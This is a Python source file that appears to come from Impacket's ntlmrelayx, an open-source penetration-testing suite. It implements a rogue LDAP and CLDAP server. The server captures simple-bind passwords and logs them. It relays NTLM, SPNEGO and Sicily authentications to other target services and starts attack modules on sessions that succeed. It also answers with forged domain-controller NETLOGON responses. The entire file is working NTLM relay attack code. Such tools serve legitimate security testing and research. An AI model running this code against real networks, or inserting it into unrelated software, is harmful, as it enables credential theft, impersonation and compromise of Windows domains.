# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Relay Server
#
#   This is the LDAP server which relays the connections
#   to other protocols
#
# Authors:
#   Alberto Solino (@agsolino)
#
from __future__ import division
from __future__ import print_function
from binascii import hexlify
from threading import Thread
import socket
import logging
import traceback

import struct
import socket
import logging
from threading import Thread
from impacket.ldap import ldapasn1
from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import univ
from pyasn1_ldap.rfc4511 import LDAPMessage as ParsableLDAPMessage
from ldap3.protocol.rfc4511 import LDAPMessage, ProtocolOp, SearchResultEntry, PartialAttributeList, PartialAttribute, SearchResultDone, Vals
from pyasn1.codec.ber import decoder
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from pyasn1.type.univ import Sequence
from impacket import ntlm
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp
from impacket.nt_errors import STATUS_SUCCESS, STATUS_MORE_PROCESSING_REQUIRED
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from scapy.all import NETLOGON_SAM_LOGON_RESPONSE_EX, UUID

class LDAPRelayServer(Thread):
    def __init__(self,config):
        Thread.__init__(self)
        self.daemon = True
        self.server = 0
        #Config object
        self.config = config
        #Current target IP
        self.target = None
        #Targets handler
        self.targetprocessor = self.config.target
        #Username we auth as gets stored here later
        self.authUser = None
        self.proxyTranslator = None
        self.challenges = {}

        # Change address_family to IPv6 if this is configured
        if self.config.ipv6:
            self.address_family = socket.AF_INET6
        else:
            self.address_family = socket.AF_INET

        if self.config.listeningPort:
            self.ldapport = self.config.listeningPort
        else:
            self.ldapport = 389

    def run(self):
        logging.info("Setting up LDAP Server on port %s" % self.ldapport)
        self.sock = socket.socket(self.address_family, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.config.interfaceIp, self.ldapport))
        self.sock.listen(1)

        CLDAPResponseServer(self.config).start()

        while True:
            conn, addr = self.sock.accept()
            logging.info('LDAP connection from %s' % str(addr))
            handler = LDAPHandler(conn, addr, self)
            handler.start()

class LDAPHandler(Thread):
    def __init__(self, conn, addr, server):
        Thread.__init__(self)
        self.daemon = True
        self.conn = conn
        self.addr = addr
        self.server = server
        self.client = None
        self.challengeMessage = None

    def run(self):
        connection_active = True
        while connection_active:
            try:
                data = self.conn.recv(8192)
                if not data:
                    break

                while len(data) > 0:
                    decoded_message, data = decoder.decode(data, asn1Spec=ldapasn1.LDAPMessage())

                    if decoded_message['protocolOp'].getName() == 'bindRequest':
                        self.handle_bind_request(decoded_message)
                    elif decoded_message['protocolOp'].getName() == 'searchRequest':
                        self.handle_search_request(decoded_message)
                    elif decoded_message['protocolOp'].getName() == 'unbindRequest':
                        logging.info("LDAP: Unbind request received, closing connection.")
                        connection_active = False
                        break
                    else:
                        logging.warning("LDAP server only supports BIND, SEARCH and UNBIND requests, received %s" % decoded_message['protocolOp'].getName())

            except Exception:
                logging.error("Exception in LDAPHandler.run:")
                logging.error(traceback.format_exc())
                break
        self.conn.close()

    def handle_search_request(self, ldap_message):
        search_request = ldap_message['protocolOp']['searchRequest']
        # We need to craft a searchResEntry and a searchResDone message to the client
        # This is a fake search entry, but it should be enough to make the client happy
        search_res_entry = ldapasn1.SearchResultEntry()
        search_res_entry['objectName'] = ''
        
        attributes = ldapasn1.PartialAttributeList()
        for requested_attribute in search_request['attributes']:
            pa = ldapasn1.PartialAttribute()
            pa['type'] = requested_attribute
            vals = univ.SetOf()
            if str(requested_attribute) == 'defaultNamingContext':
                vals.append(ldapasn1.AttributeValue('DC=impacket,DC=local'))
            #if str(requested_attribute) == 'supportedSASLMechanisms':
            #    # this can be used to force GSS-SPNEGO, maybe interesting for debugging
            #    vals.append(ldapasn1.AttributeValue('GSS-SPNEGO'))
            pa['vals'] = vals
            attributes.append(pa)
        search_res_entry['attributes'] = attributes
        
        response_ldap_message_entry = ldapasn1.LDAPMessage()
        response_ldap_message_entry['messageID'] = ldap_message['messageID']
        response_ldap_message_entry['protocolOp']['searchResEntry'] = search_res_entry
        self.conn.sendall(encoder.encode(response_ldap_message_entry))

        search_res_done = ldapasn1.SearchResultDone()
        search_res_done['resultCode'] = ldapasn1.ResultCode('success')
        search_res_done['matchedDN'] = ''
        search_res_done['diagnosticMessage'] = ''

        response_ldap_message_done = ldapasn1.LDAPMessage()
        response_ldap_message_done['messageID'] = ldap_message['messageID']
        response_ldap_message_done['protocolOp']['searchResDone'] = search_res_done

        self.conn.sendall(encoder.encode(response_ldap_message_done))

    def handle_bind_request(self, ldap_message):
        bind_request = ldap_message['protocolOp']['bindRequest']
        #logging.debug("LDAP: Full bind request: %s" % bind_request)
        auth_choice = bind_request['authentication']
        
        logging.debug("LDAP: Received bind request with auth choice: %s" % auth_choice.getName())

        if auth_choice.getName() == 'sasl':
            sasl_credentials = auth_choice['sasl']
            mechanism = sasl_credentials['mechanism']
            
            if 'GSS-SPNEGO' in str(mechanism):
                self.handle_spnego_bind(ldap_message, sasl_credentials)
            else:
                logging.error("Unsupported SASL mechanism: %s" % mechanism)
        elif auth_choice.getName() == 'simple':
            username = bind_request['name'].asOctets().decode('utf-8')
            password = auth_choice['simple'].asOctets().decode('utf-8')
            self.handle_simple_bind(ldap_message, username, password)
        elif auth_choice.getName() == 'sicilyNegotiate' or auth_choice.getName() == 'sicilyResponse':
            self.handle_sicily_bind(ldap_message, auth_choice)
        else:
            logging.error("Unsupported authentication choice: %s" % auth_choice.getName())

    def handle_simple_bind(self, ldap_message, username, password):
        logging.debug("LDAP: Simple bind request received for user: %r" % username)
        logging.debug("LDAP: Password: %r" % password)
        if not username:
            logging.warning("LDAP: Anonymous bind requests cannot be relayed (or username was not parsed correctly).")
            # Send a bind response indicating success
            bind_response = ldapasn1.BindResponse()
            bind_response['resultCode'] = ldapasn1.ResultCode('invalidCredentials')
            bind_response['matchedDN'] = ''
            bind_response['diagnosticMessage'] = ''

            response_ldap_message = ldapasn1.LDAPMessage()
            response_ldap_message['messageID'] = ldap_message['messageID']
            response_ldap_message['protocolOp']['bindResponse'] = bind_response

            self.conn.sendall(encoder.encode(response_ldap_message))
            return
            
        if self.server.config.mode.upper() == 'REFLECTION':
            self.server.targetprocessor = TargetsProcessor(singleTarget='LDAP://%s:%d' % (self.addr[0], self.ldapport))

        self.server.target = self.server.targetprocessor.getTarget()
        if self.server.target is None:
            if self.server.config.keepRelaying:
                self.server.config.target.reloadTargets(full_reload=True)
                self.target = self.server.config.target.getTarget(multiRelay=False)
            else:
                logging.info('LDAP: No more targets left!')
                return

        logging.info("LDAP: Relaying credentials for %s to %s://%s" % (username, self.server.target.scheme, self.server.target.netloc))

        try:
            self.client = self.server.config.protocolClients[self.server.target.scheme.upper()](self.server.config, self.server.target)
            if not self.client.initConnection():
                raise Exception("Could not initialize connection")
        except Exception as e:
            logging.error("LDAP: Connection against target %s://%s FAILED: %s" % (self.server.target.scheme, self.server.target.netloc, str(e)))
            self.server.targetprocessor.registerTarget(self.server.target, False, username)
            return

        clientResponse, error_code = self.client.login(username, password)

        if error_code == STATUS_SUCCESS:
            logging.info("LDAP: Authentication successful!")
            self.server.targetprocessor.registerTarget(self.server.target, True, username)
            if self.server.target.scheme.upper() in self.server.config.attacks:
                clientThread = self.server.config.attacks[self.server.target.scheme.upper()](self.server.config, self.client.session, username)
                clientThread.start()
        else:
            logging.error("LDAP: Authentication failed!")
            self.server.targetprocessor.registerTarget(self.server.target, False, username)

        bind_response = ldapasn1.BindResponse()
        bind_response['resultCode'] = ldapasn1.ResultCode('success')
        bind_response['matchedDN'] = ''
        bind_response['diagnosticMessage'] = ''
        
        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response
        
        self.conn.sendall(encoder.encode(response_ldap_message))

    def handle_sicily_bind(self, ldap_message, auth_choice):
        token = auth_choice.getComponent().asOctets()
        logging.debug("LDAP: Received Sicily NTLM token: %r" % token)
        from impacket.structure import hexdump
        logging.debug("LDAP: Sicily NTLM token hexdump:")
        if logging.getLogger().level == logging.DEBUG:
            hexdump(token)

        if not token.startswith(b'NTLMSSP\x00'):
            logging.error("Unknown NTLM message type")
            return

        message_type = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
        logging.debug("LDAP: NTLM message type: %d" % message_type)

        if message_type == 0x01:  # NTLMSSP_NEGOTIATE
            self.handle_negotiate(ldap_message, token, auth_type='sicily')
        elif message_type == 0x03:  # NTLMSSP_AUTH
            self.handle_auth(ldap_message, token)
        else:
            logging.error("Unknown NTLM message type: %d" % message_type)

    def spnego_ntlm_reauth_negTokenResp(self, ldap_message):
        bind_response = ldapasn1.BindResponse()
        bind_response['diagnosticMessage'] = ''
        bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
        bind_response['matchedDN'] = ''

        resp_token = SPNEGO_NegTokenResp()
        resp_token['NegState'] = b'\x03'  # request-mic
        resp_token['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

        bind_response['serverSaslCreds'] = resp_token.getData()

        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response

        self.conn.sendall(encoder.encode(response_ldap_message))

    def handle_spnego_bind(self, ldap_message, sasl_credentials):
        token = sasl_credentials['credentials']
        #logging.debug("LDAP: Received SPNEGO token: %r" % token)
        
        if len(token) == 0:
            return
        neg_token_init = None
        try:
            neg_token_init = SPNEGO_NegTokenInit(token.asOctets())
            mech_token = neg_token_init['MechToken']
        except:
            # It's probably a NTLMSSP AUTH packet
            mech_token = token.asOctets()
        
        # Search for the NTLMSSP header
        ntlm_header = b'NTLMSSP\x00'
        ntlm_start = mech_token.find(ntlm_header)
        if ntlm_start == -1:
            if neg_token_init and len(neg_token_init['MechTypes']) > 0:
                if neg_token_init['MechTypes'][0] != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                    TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] in neg_token_init['MechTypes']:
                    logging.info("LDAP: NTLM is supported, but not the primary mechtype, so we ask for negotiation")
                    self.spnego_ntlm_reauth_negTokenResp(ldap_message)
                else:
                    logging.info("LDAP: NTLM is not a supported mechtype")
                    self.spnego_ntlm_reauth_negTokenResp(ldap_message)
            else:
                logging.error("No NTLM message type")
            return
        
        mech_token = mech_token[ntlm_start:]
        from impacket.structure import hexdump
        logging.debug("LDAP: NTLM message from mech_token hexdump:")
        if logging.getLogger().level == logging.DEBUG:
            hexdump(mech_token)
        if not mech_token.startswith(b'NTLMSSP\x00'):
            logging.error("Unknown NTLM message type")
            return

        message_type = struct.unpack('<L', mech_token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
        logging.debug("LDAP: NTLM message type: %d" % message_type)
        
        if message_type == 0x01: # NTLMSSP_NEGOTIATE
            self.handle_negotiate(ldap_message, mech_token, auth_type='spnego')
        elif message_type == 0x03: # NTLMSSP_AUTH
            self.handle_auth(ldap_message, mech_token)
        else:
            logging.error("Unknown NTLM message type: %d" % message_type)

    def handle_negotiate(self, ldap_message, negotiate_message_data, auth_type='spnego'):
        if self.server.config.mode.upper() == 'REFLECTION':
            self.server.targetprocessor = TargetsProcessor(singleTarget='LDAP://%s:%d' % (self.addr[0], self.ldapport))

        self.server.target = self.server.targetprocessor.getTarget()
        if self.server.target is None:
            if self.server.config.keepRelaying:
                self.server.config.target.reloadTargets(full_reload=True)
                self.server.target = self.server.config.target.getTarget(multiRelay=False)
            else:
                logging.info('LDAP: No more targets left!')
                return

        logging.info("LDAP: Relaying credentials to %s://%s" % (self.server.target.scheme, self.server.target.netloc))

        try:
            self.client = self.server.config.protocolClients[self.server.target.scheme.upper()](self.server.config, self.server.target)
            if not self.client.initConnection():
                raise Exception("Could not initialize connection")
        except Exception as e:
            logging.error("LDAP: Connection against target %s://%s FAILED: %s" % (self.server.target.scheme, self.server.target.netloc, str(e)))
            self.server.targetprocessor.registerTarget(self.server.target, False, self.server.authUser)
            return

        self.challengeMessage = self.client.sendNegotiate(negotiate_message_data)
        self.server.challenges[self.addr[0]] = self.challengeMessage

        bind_response = ldapasn1.BindResponse()
        bind_response['diagnosticMessage'] = ''

        if auth_type == 'spnego' and not negotiate_message_data.startswith(b'NTLMSSP\x00'):
            bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
            bind_response['matchedDN'] = ''

            resp_token = SPNEGO_NegTokenResp()
            resp_token['NegState'] = b'\x01'  # accept-incomplete
            resp_token['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
            resp_token['ResponseToken'] = self.challengeMessage.getData()

            bind_response['serverSaslCreds'] = resp_token.getData()
        elif auth_type == 'spnego':
            bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
            bind_response['matchedDN'] = ''

            bind_response['serverSaslCreds'] = self.challengeMessage.getData()
        elif auth_type == 'sicily':
            bind_response['resultCode'] = ldapasn1.ResultCode('saslBindInProgress')
            bind_response['matchedDN'] = self.challengeMessage.getData()

        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response

        self.conn.sendall(encoder.encode(response_ldap_message))

    @staticmethod
    def check_signing_or_sealing_required(authenticateMessageBlob):
        if struct.unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        authMessage = ntlm.NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        if authMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_SIGN == ntlm.NTLMSSP_NEGOTIATE_SIGN or \
           authMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_SEAL == ntlm.NTLMSSP_NEGOTIATE_SEAL:
            return True
        return False

    def handle_auth(self, ldap_message, auth_message_data):
        if self.challengeMessage is None:
            if self.addr[0] in self.server.challenges:
                self.challengeMessage = self.server.challenges.pop(self.addr[0])
            else:
                logging.error("No challenge message found for %s" % self.addr[0])
                return
        
        from impacket.structure import hexdump
        logging.debug("LDAP: auth_message_data hexdump:")
        if logging.getLogger().level == logging.DEBUG:
            hexdump(auth_message_data)
        
        authenticate_message = ntlm.NTLMAuthChallengeResponse()
        authenticate_message.fromString(auth_message_data)
        logging.debug("LDAP: NTLM AUTH FIELDS: domain_name: %r, user_name: %r, ntlm response length: %d" % (
            authenticate_message['domain_name'],
            authenticate_message['user_name'],
            len(authenticate_message['ntlm'])
        ))
        self.server.authUser = authenticate_message.getUserString()
        logging.debug("LDAP: Authenticated user string: %r" % self.server.authUser)

        clientResponse, error_code = self.client.sendAuth(auth_message_data, self.challengeMessage['challenge'])

        if error_code == STATUS_SUCCESS:
            logging.info("LDAP: Authentication successful!")
            self.server.targetprocessor.registerTarget(self.server.target, True, self.server.authUser)
            if self.server.target.scheme.upper() in self.server.config.attacks:
                clientThread = self.server.config.attacks[self.server.target.scheme.upper()](self.server.config, self.client.session, self.server.authUser)
                clientThread.start()
        else:
            logging.error("LDAP: Authentication failed!")
            self.server.targetprocessor.registerTarget(self.server.target, False, self.server.authUser)

        bind_response = ldapasn1.BindResponse()
        if self.check_signing_or_sealing_required(auth_message_data):
            # with signing or sealing, we cannot read the traffic, so we drop the client
            logging.info("LDAP: Incoming connection requires signing or sealing, so we cannot read the traffic and close the connection.")
            bind_response['resultCode'] = ldapasn1.ResultCode('invalidCredentials')
        else:
            bind_response['resultCode'] = ldapasn1.ResultCode('success')
        bind_response['matchedDN'] = ''
        bind_response['diagnosticMessage'] = ''
        
        response_ldap_message = ldapasn1.LDAPMessage()
        response_ldap_message['messageID'] = ldap_message['messageID']
        response_ldap_message['protocolOp']['bindResponse'] = bind_response
        
        self.conn.sendall(encoder.encode(response_ldap_message))

class CLDAPResponseServer(LDAPRelayServer):    
    def run(self):
        logging.info("Setting up CLDAP Server on port %s" % self.ldapport)
        self.sock = socket.socket(self.address_family, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.config.interfaceIp, self.ldapport))

        while True:
            message, addr = self.sock.recvfrom(8192)
            logging.info('CLDAP connection from %s' % str(addr))
            handler = CLDAPHandler(addr, message, self)
            handler.start()

# MS-ADTS 6.3.1.2 DS_FLAG Options Bits
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f55d3f53-351d-4407-940e-f53eb6154af0
# https://github.com/microsoft/win32metadata/blob/main/generation/WinSDK/RecompiledIdlHeaders/um/DsGetDC.h
class DS_FLAG_OPTIONS:
    DS_PDC_FLAG = 0x00000001 # The server holds the PDC FSMO role (PdcEmulationMasterRole). FSMO roles are defined in section 3.1.1.1.11. Certain updates can be performed only on the holder of the PDC FSMO role (see Updates Performed Only on FSMOs (section 3.1.1.5.1.8)).
    DS_GC_FLAG = 0x00000004 # The server is a GC server and will accept and process messages directed to it on the global catalog ports (see section 3.1.1.3.1.10).
    DS_LDAP_FLAG = 0x00000008 # The server is an LDAP server.
    DS_DS_FLAG = 0x00000010 # The server is a DC.
    DS_KDC_FLAG = 0x00000020 # The server is running the Kerberos Key Distribution Center service.
    DS_TIMESERV_FLAG = 0x00000040 # The Win32 Time Service, as specified in [MS-W32T], is present on the server.
    DS_CLOSEST_FLAG = 0x00000080 # The server is in the same site as the client. This is a hint to the client that it is well-connected to the server in terms of speed.
    DS_WRITABLE_FLAG = 0x00000100 # Indicates that the server is not an RODC. As described in section 3.1.1.1.9, all NC replicas hosted on an RODC do not accept originating updates.
    DS_GOOD_TIMESERV_FLAG = 0x00000200 # The server is a reliable time server.
    DS_NDNC_FLAG = 0x00000400 # The NC is an application NC.
    DS_SELECT_SECRET_DOMAIN_6_FLAG = 0x00000800 # The server is an RODC.
    DS_FULL_SECRET_DOMAIN_6_FLAG = 0x00001000 # The server is a writable DC, not running Windows 2000 Server operating system through Windows Server 2003 R2 operating system.
    DS_WS_FLAG = 0x00002000 # The Active Directory Web Service, as specified in [MS-ADDM], is present on the server.
    DS_DS_8_FLAG = 0x00004000 # The server is not running Windows 2000 operating system through Windows Server 2008 R2 operating system.
    DS_DS_9_FLAG = 0x00008000 # The server is not running Windows 2000 through Windows Server 2012 operating system.
    DS_DS_10_FLAG = 0x00010000 # DC is running Windows Server 2016 or later
    DS_KEY_LIST_FLAG = 0x00020000 #  DC supports key list requests
    DS_DS_13_FLAG = 0x00040000 #  DC is running Windows Server 2025 or later
    DS_DNS_CONTROLLER_FLAG = 0x20000000 # The server has a DNS name.
    DS_DNS_DOMAIN_FLAG = 0x40000000 # The NC is a default NC.
    DS_DNS_FOREST_FLAG = 0x80000000 # The NC is the forest root.

    DS_PING_FLAGS = 0x000FFFFF

    default_flags = DS_PDC_FLAG | DS_GC_FLAG | DS_LDAP_FLAG \
        | DS_DS_FLAG | DS_KDC_FLAG | DS_TIMESERV_FLAG \
        | DS_CLOSEST_FLAG | DS_WRITABLE_FLAG | DS_GOOD_TIMESERV_FLAG \
        | DS_FULL_SECRET_DOMAIN_6_FLAG | DS_WS_FLAG | DS_DS_8_FLAG \
        | DS_DS_9_FLAG | DS_DS_10_FLAG | DS_KEY_LIST_FLAG | DS_DS_13_FLAG

class CLDAPHandler(Thread):
    def __init__(self, addr, message: bytes, server: CLDAPResponseServer):
        Thread.__init__(self)
        self.addr = addr
        self.server = server
        self.message, _ = decoder.decode(message, asn1Spec=ParsableLDAPMessage())

    def run(self):
        netlogon_response = NETLOGON_SAM_LOGON_RESPONSE_EX(
            NtVersion=5, 
            OpCode=23,
            Sbz=0, 
            Flags=DS_FLAG_OPTIONS.default_flags,
            DomainGuid=UUID('e281f5c0-c05f-423d-9add-c0ffee084f27'), 
            DnsForestName=b'is.ignored.', 
            DnsDomainName=b'is.ignored.',
            DnsHostName=b'machine.is.ignored.',
            NetbiosDomainName=b'IGNORED.',
            NetbiosComputerName=b'MACHINE.',
            UserName=b'.',
            DcSiteName=b'Default-First-Site-Name.',
            ClientSiteName=b'Default-First-Site-Name.',
            LmNtToken=65535,
            Lm20Token=65535)

        netlogon_response_vals = Vals().setComponentByPosition(0, netlogon_response.build())
        pa = PartialAttribute().setComponentByName("type",b"Netlogon").setComponentByName("vals",netlogon_response_vals)
        pl = PartialAttributeList().setComponentByPosition(0,pa)
        search_result = SearchResultEntry().setComponentByName("attributes",pl).setComponentByName("object", "")

        op_bindRequest = ProtocolOp().setComponentByName("searchResEntry",search_result)

        message = LDAPMessage().setComponentByName("messageID", self.message["messageID"]._value) \
                               .setComponentByName("protocolOp", op_bindRequest)

        op_done = ProtocolOp().setComponentByName("searchResDone",
                        SearchResultDone().setComponentByName("resultCode",0) \
                                        .setComponentByName("matchedDN","") \
                                        .setComponentByName("diagnosticMessage",""))

        message_done = LDAPMessage().setComponentByName("messageID", self.message["messageID"]._value) \
                                    .setComponentByName("protocolOp", op_done)

        logging.debug('Sending CLDAP NETLOGON packet to %s' % str(self.addr))
        
        self.server.sock.sendto(encoder.encode(message)+encoder.encode(message_done), self.addr)
